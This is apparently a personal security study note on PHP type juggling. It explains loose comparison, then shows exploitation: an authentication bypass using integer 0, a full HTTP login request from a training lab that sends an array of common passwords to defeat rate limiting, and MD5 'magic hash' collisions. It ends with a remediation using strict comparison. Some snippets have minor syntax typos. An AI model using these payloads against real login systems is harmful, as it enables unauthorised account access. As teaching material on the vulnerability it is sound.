>[!warning]
>**PHP does not require (or support) explicit type definition in variable declaration**; a variable's type is determined by the context in which the variable is used. 
>That is to say, if a string value is assigned to variable `$var`, `$var` becomes a string. If an int value is then assigned to `$var`, it becomes an int.

![|700](../../zzz_res/attachments/Pasted%20image%2020221210135017.png)

![|700](../../zzz_res/attachments/Pasted%20image%2020221210135040.png)

# Examples

During the comparison of variables of **different types**, PHP will first **convert them to a common**, comparable type.

```php
$example_int = 7
$example_str = "7"
if ($example_int == $example_str) {   
	echo("PHP can compare ints and strings.")
}
```

The comparison between *7* and *“7”* returns *True* because the two variables are both converted to a common type (int) therefore resulting equals.

The same behavior happens here:

```php
if ("7 puppies" == 7){
	return 0;
}
```

The number is extracted from the string and is then compared with the integer.

Let’s see another example:

```php
if ("Puppies" == 0) {
	retrun 0;
}
```

Also in this case the comparison returns *True* because the string is converted to a 0 in order to be compared with a number.

# Exploitation

## Authentication bypass

```php
if ($_POST["password"] == "Admin_Password") {login_as_admin();}
```

Passing an **integer** *0* as a password the comparison become `(0 == “Admin_Password”) -> True`, granting the access without knowing the real password.

## Rate-limit bypass

Type confusions attacks can also be used to bypass brute-force protection mechanism based on rate limit:

```http
POST /login HTTP/1.1
Host: 0a690029038e65bfc04ed2d1007d0057.web-security-academy.net
Cookie: session=Zb1D8NGHIvy10kSH26Xrwex4kxtvUPHZ
Content-Length: 1194
Sec-Ch-Ua: "Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: https://0a690029038e65bfc04ed2d1007d0057.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a690029038e65bfc04ed2d1007d0057.web-security-academy.net/login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

{"username":"carlos","password":["123456",
"password",
"12345678",
"qwerty",
"123456789",
"12345",
"1234",
"111111",
"1234567",
...
"moscow"
],"":""}
```


## Magic Hashes

>[!info]
>Further information on [Magic Hashes](https://www.whitehatsec.com/blog/magic-hashes/)

The hexadecimal character space used for the representation of various hash types is **a-fA-F0-9**. 
This implies that it may be possible to discover a plain-text value whose MD5 hash conforms to the format of scientific exponent notation. In the case of MD5, that is indeed true and the specific string was discovered by Michal Spacek.

```php
student@atutor:~$ php -a
Interactive mode enabled
php > echo md5('240610708');
0e462097431906509019562988736854
php > var_dump('0e462097431906509019562988736854' == '0');
bool(true)
```

The MD5 of this particular string (listing 148) translates to a valid number formatted in the [scientific exponential notation](https://www.php.net/manual/en/language.types.float.php), and its value evaluates to zero.

# Remediation

When comparing values, always try to use the type-safe comparison operator `"==="` instead of the loose comparison operator `"=="`. This will ensure that PHP does not type juggle and the operation will only return True if the types of the two variables also match. 

```php
$example_int = 7
$example_str = "7"
if ($example_int === $example_str) {   
	echo("PHP can compare ints and strings.");
}
```

In this scenario, the comparison result is *False*

---

# External Resources

- [PHP Type Juggling Vulnerabilities](https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09)